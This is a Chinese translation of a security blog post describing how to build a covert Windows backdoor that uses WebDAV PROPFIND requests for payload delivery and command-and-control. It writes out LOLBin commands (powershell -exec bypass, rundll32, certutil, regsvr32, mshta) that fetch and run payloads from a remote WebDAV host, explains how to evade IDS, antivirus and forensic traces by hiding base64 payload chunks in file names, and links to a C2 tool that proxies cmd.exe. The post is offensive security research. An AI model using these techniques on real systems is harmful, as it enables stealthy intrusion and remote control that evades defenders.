> 原文链接: https://www.anquanke.com//post/id/86894 


# 【技术分享】利用WebDAV特性建立隐蔽后门


                                阅读量   
                                **195039**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者，文章来源：arno0x0x.wordpress.com
                                <br>原文地址：[https://arno0x0x.wordpress.com/2017/09/07/using-webdav-features-as-a-covert-channel/](https://arno0x0x.wordpress.com/2017/09/07/using-webdav-features-as-a-covert-channel/)

译文仅供参考，具体内容表达以及含义原文为准

[![](https://p0.ssl.qhimg.com/t01f4abbc1a0670318f.jpg)](https://p0.ssl.qhimg.com/t01f4abbc1a0670318f.jpg)

****

译者：[Ska](http://bobao.360.cn/member/contribute?uid=24753802)

预估稿费：200RMB

投稿方式：发送邮件至linwei#360.cn，或登陆网页版在线投稿



**前言——隐蔽后门的设计与需求**

我最近一直想为Windows系统设计一个隐蔽后门，主要功能是：

**传递各种恶意的payloads（shellcode，二进制文件，脚本等等…）**

**将其用作 C&amp;C 通道**

为了取得成功，攻击者必须克服越来越多的挑战，特别是在企业环境中：<br>

**绕过IDS / IPS**

**绕过各种防护软件（桌面，代理，邮件网关等）**

**代理感知和代理友好**

**DFIR友好，这里指从攻击者的角度来看**

1.    尝试使用被忽视的通信渠道

2.    避免在磁盘上操作，或至少避免在以后无法擦除的位置写入信息

3.    尽可能在内存中工作

**不要触发事件数据记录器****：**

1.    MS-Office二进制文件或脚本引擎（powershell，script host）执行HTTP请求是很可疑的

2.    MS-Office二进制文件或脚本引擎（powershell，script host）在临时文件夹中写入某些类型的文件是很可疑的

**WebDAV**协议具有许多有趣的特性，恰巧满足这些需求：

**Windows操作系统内置支持此协议**

**许多内置的API函数，以及使用这些API的二进制文件和命令行工具，支持UNC（通用命名约定）路径。**这有几个优点：

1.    您不需要注意实现网络通信部分（没有使用任何“常用”的网络对象：Microsoft.XMLHTTP，WinHttp.WinHttpRequest，System.Net.WebClient）

2.    它将看起来像操作系统正在执行网络请求。 更确切地说，正在使用WebClient服务，因此我们可以看到连接到WebDAV服务器的svchost.exe进程，而不是powershell.exe，cscript.exe，regsvr32.exe或任何MS-Office二进制文件

3.    它是代理感知和代理友好的，如果需要，它可以使用代理身份验证

**它可以传递代理（而不是一些纯TCP或UDP回调通道）**

**<br>**

**Windows UNC路径处理挖掘**

为了实验WebDAV，我首先使用一个简单的**Docker映像**建立一个WebDAV服务器：

```
docker pull visity / webdav
```

Windows操作系统通过**WebClient**服务为WebDAV协议提供支持。 必须首先启动此服务，以便命令行工具和Windows API功能可以支持指向WebDAV服务器的UNC路径。 有趣的是，我发现如果WebClient服务没有启动，那么标准用户（即：没有管理员权限）不能通过常规方式启动它（services.msc或sc start webclient），但是使用 pushd \ webdav.server.com 命令映射WebDAV共享上的虚拟驱动器即使从普通用户也将自动启动服务。

[![](https://p2.ssl.qhimg.com/t01f2625c149c775976.jpg)](https://camo.githubusercontent.com/90c93f0c15466e0fef4926736d2c4101bb18137b/68747470733a2f2f646c2e64726f70626f7875736572636f6e74656e742e636f6d2f732f65616562716379766e73626c71336e2f7765626461765f30302e6a70673f646c3d30)<br>

一旦启动了WebClient服务，我们就可以开始用一些我们最喜爱的命令行工具来查看他们是否支持UNC指向我们的WebDAV服务器。

这是我同时在Windows 7和Windows 10上进行测试的结果：

成功的命令：



```
powershell.exe -exec bypass -f \webdav.server.compayload.ps1
rundll32.exe \webdav.server.compayload.dll,entryPoint
certutil.exe -decode \webdav.server.compayload.b64 payload.dll
```

成功的API调用：



```
VBA: Dir("\webdav.server.comsomepath")
.Net: Directory.EnumerateFiles("\webdav.server.comsomepath")
```

失败的命令：



```
regsvr32.exe /s /n /u /i:\webdav.server.compayload.sct scrobj.dll
C:WindowsMicrosoft.NETFrameworkv4.0.30319msbuild.exe \webdav.server.compayload.xml
copy \webdav.server.compayload payload
xcopy \webdav.server.compayload payload
mshta \webdav.server.compayload.hta
C:WindowsMicrosoft.NETFrameworkv4.0.30319csc.exe /out:payload.exe \webdav.server.compayload.cs
```

这些失败的命令看上去与我想的不一致，因为在一些情况下，操作系统似乎能够通过远程文件系统访问文件（通过WebClient服务通过WebDAV协议）提供某种抽象层， 而在其他一些情况下，它却不行…这其中一定有一个原因，但我找不到为什么。

**<br>**

**利弊**

到目前为止，使用指向WebDAV服务器的UNC路径证明具有以下优点：

1.    为了提供一些（初始）Payloads，不需要实现网络通信部分。 这不仅是方便的，同时也可能避免被著名的"System.Net.WebClient().DownloadString() powershell技巧检测到。

2.    Svchost.exe是执行网络通信的唯一过程（EDR友好）

3.    自动代理意识（包括认证），这在企业环境中是一个明确的“必须”。

然而，还有一些缺点：

1.    通过上述命令中所示的UNC路径访问/下载的所有有效载荷都会在WedDAV客户端缓存（C:WindowsServiceProfilesLocalServiceAppDataLocalTempTfsStoreTfs_DAV）中本地复制。 这绝对不是对DFIR友好，因为它在磁盘上写，就可能会触发本地防病毒软件。

[![](https://p2.ssl.qhimg.com/t010d137c3e1869e036.png)](https://camo.githubusercontent.com/9efeb62cafb9953f6c13e02c39ea3856963a3d53/68747470733a2f2f646c2e64726f70626f7875736572636f6e74656e742e636f6d2f732f67726c673561676c727a38727278662f7765626461765f30312e706e673f646c3d30)

2.    恶意的Payloads仍然会被诸如**IPS**之类的外围安全系统阻止，或更有可能被Web代理防病毒软件阻止。

那么我们如何摆脱这些缺陷，并以一种聪明的方式使用WebDAV作为提供Payloads的隐蔽通道呢？

**<br>**

**一些WebDAV内部组件 – OPTIONS / PROPFIND / GET**

请记住，WebDAV只是HTTP协议的扩展，使用自己的一组HTTP动词（例如：PROPFIND，MKCOL，MOVE，LOCK等）和HTTP头（Depth，translate等），使用XML作为元数据传输的数据格式。

因此，当WebClient服务（即：WebDAV客户端）首先连接到WebDAV服务器时，它将通过执行以下请求来询问支持的选项：



```
OPTIONS / HTTP/1.1
Connection: Keep-Alive
User-Agent: Microsoft-WebDAV-MiniRedir/10.0.14393
translate: f
Host: 10.211.55.2
```

WebDAV服务器通常将通过以下响应进行回应，详细说明其实现支持的所有选项：



```
HTTP/1.1 200 OK
Server: nginx/1.6.2
Date: Thu, 07 Sep 2017 10:15:36 GMT
Content-Length: 0
DAV: 1
Allow: GET,HEAD,PUT,DELETE,MKCOL,COPY,MOVE,PROPFIND,OPTIONS
Proxy-Connection: Close
Connection: Close
Age: 0
```

那么通常会使用一些标题为“Depth: 0”的PROPFIND请求，以便WebDAV客户端获取有关它所在位置的信息（目录，大小，创建日期和其他类型的元数据）以及某些默认的Windows文件作为“Desktop.ini”或“Autorun.inf”（无论这些文件是否存在于WebDAV服务器上）。 请求看起来像这样：



```
PROPFIND / HTTP/1.1
Connection: Keep-Alive
User-Agent: Microsoft-WebDAV-MiniRedir/10.0.14393
Depth: 0
translate: f
Content-Length: 0
Host: 10.211.55.2
```

重要的是要注意，在这一点上，客户端的硬盘驱动器上没有传输实际的文件，也没有缓存。

然后，如果WebDAV客户端要求远程目录中所有文件的列表，它将发出一些PROPFIND请求，其中一个标题为“Depth: 1”，如下所示：



```
PROPFIND / HTTP/1.1
Connection: Keep-Alive
User-Agent: Microsoft-WebDAV-MiniRedir/10.0.14393
Depth: 1
translate: f
Content-Length: 0
Host: 10.211.55.2
```

WebDAV服务器将回复当前目录中存在的所有文件的XML格式列表，以及一些元数据信息（大小，创建日期等）。 每个 &lt;D:response&gt; 块对应一条文件信息：



```
HTTP/1.1 207 Multi-Status
Server: nginx/1.6.2
Date: Thu, 07 Sep 2017 10:27:23 GMT
Content-Length: 8084
Proxy-Connection: Keep-Alive
Connection: Keep-Alive
&lt;?xml version="1.0" encoding="utf-8" ?&gt;
&lt;D:multistatus xmlns:D="DAV:"&gt;
&lt;D:response&gt;
&lt;D:href&gt;/&lt;/D:href&gt;
&lt;D:propstat&gt;
&lt;D:prop&gt;
&lt;D:creationdate&gt;2017-09-07T10:27:23Z&lt;/D:creationdate&gt;
&lt;D:displayname&gt;filename&lt;/D:displayname&gt;
&lt;D:getcontentlanguage/&gt;
&lt;D:getcontentlength&gt;4096&lt;/D:getcontentlength&gt;
&lt;D:getcontenttype/&gt;
&lt;D:getetag/&gt;
&lt;D:getlastmodified&gt;Thu, 07 Sep 2017 10:27:23 GMT&lt;/D:getlastmodified&gt;
&lt;D:lockdiscovery/&gt;
&lt;D:resourcetype&gt;&lt;D:collection/&gt;&lt;/D:resourcetype&gt;
&lt;D:source/&gt;
&lt;D:supportedlock/&gt;
&lt;/D:prop&gt;
&lt;D:status&gt;HTTP/1.1 200 OK&lt;/D:status&gt;
&lt;/D:propstat&gt;
&lt;/D:response&gt;
[...]
&lt;/D:multistatus&gt;
```

在这一点上，仍然没有实际的文件传输，客户端硬盘上没有缓存文件。

最终，当WebDAV客户端想要访问文件时，它将发出实际传输文件的请求，如下所示：



```
GET /calc.hta HTTP/1.1
Cache-Control: no-cache
Connection: Keep-Alive
Pragma: no-cache
User-Agent: Microsoft-WebDAV-MiniRedir/10.0.14393
translate: f
Host: 10.211.55.2
```

WebDAV服务器使用包含请求文件的十分标准的HTTP响应进行回复。 在这一点上，文件被传输并缓存在客户端的驱动器上（C:WindowsServiceProfilesLocalServiceAppDataLocalTempTfsStoreTfs_DAV）。

我们可以看到，上述两个缺点仅在文件实际从服务器传输到客户端时发生。但是事实证明，用于列出目录中的文件的PROPFIND请求也拥有可用于传输任意数据的大量信息。

**<br>**

**仅使用PROPFIND请求**

所以我们想要实现的只是使用PROPFIND请求传输任意数据。我提出了以下想法：

1.    文件名本身就是在列出具有PROPFIND请求的目录时传送的信息。

2.    目录中可能需要/需要的文件数量尽可能多（可能会有一个限制，但仍然可以处理）。

3.    虽然这取决于WebDAV客户端和服务器实现，但每个文件名可以大致为250个字符。

4.    文件名只能支持一定数量的字符（例如'/'和''不支持）

这就让我产生了以下想法，假设给定一个我想传递的Payload，可通过如下步骤处理：

1.    先对其进行base64编码

2.    替换文件名中不支持的所有字符（用'_'替换'/'，这似乎是常见的做法）

3.    将其切成250个字符的块

4.    使其可用作目录名

在远端，我需要找到一种方法：

1.    只列出虚拟目录上的文件（不GET任何东西）

2.    重组那些块

3.    将替换的字符替换回来

4.    将base64结果解码回初始Payload

所有这些都需要付出代价：大量的性能和通信浪费。但它可以让我们摆脱上述两个缺点！

为了实现这一点，我创建了一个（快速并且写的很差的）python脚本，它的行为就像一个非常非常简约的WebDAV服务器（仅支持OPTIONS和PROPFIND请求）。但这只是足以满足我们的需求。使用有效载荷文件作为参数调用此脚本，以及要使用的base64编码类型（与powershell兼容或不兼容），并将在端口80上启动WebDAV服务器：

[![](https://p1.ssl.qhimg.com/t011244cc3a76675a93.png)](https://camo.githubusercontent.com/53fe8a5dda093f939acc0c0226bdecc4d22561ef/68747470733a2f2f646c2e64726f70626f7875736572636f6e74656e742e636f6d2f732f6b76656175666b30366a6c376333622f7765626461765f30322e706e673f646c3d30)

在客户端，有很多方法可以执行适当的请求，所以我创建了一些例子，使用VBA宏或Powershell脚本，它们都只依赖于WebClient服务，这样我们以前讨论的所有其他好处仍然存在：

1.    网络外围防御系统（IPS，杀毒软件）没有检测到传输的Payload。

2.    没有文件写在WebDAV客户端缓存中，也就是磁盘上。

WebDav传输工具和一些客户端stager示例托管在此gist页面上：<br>[https://gist.github.com/Arno0x/5da411c4266e5c440ecb6ffc50b8d29a](https://gist.github.com/Arno0x/5da411c4266e5c440ecb6ffc50b8d29a)

**<br>**

**进一步使用完整的C&amp;C通信**

基于相同的原因，为什么只提供有效载荷？为什么不通过WebDAV PROPFIND请求/响应创建一个完整的C&amp;C双向通信通道？

所以我创建了一个极简代理和C&amp;C服务器，作为一个PoC。代理方是一个.Net程序集可执行文件，可以独立执行，也可以加载到一个powerhell进程的内存中。所有通信来回使用仅基于UNC路径的PROPFIND请求，因此利用WebClient服务和前面提到的所有好处。

主要特点是：

1.    创建各种stager，试图避免杀毒软件检测，这将下载Agent，然后加载到一个powershell进程内存中。

2.    在v0.1中，代理程序只需执行本地“cmd.exe”子进程，并通过WebDAV PROPFIND请求代理来自C2服务器的stdin/stdout/stderr。

[![](https://p5.ssl.qhimg.com/t019cb1942b2b2bd151.png)](https://camo.githubusercontent.com/c44e8a6b64a497637227021b91b7666834295f27/68747470733a2f2f646c2e64726f70626f7875736572636f6e74656e742e636f6d2f732f737775637639697872376261756d622f7765626461765f30332e706e673f646c3d30)

WebDavC2可以从这里下载：[https://github.com/Arno0x/WebDavC2](https://github.com/Arno0x/WebDavC2)

该代理是从我的另一个工具DBC2启发的，将这个代理的功能扩展到DBC2代理能力的程度很容易。
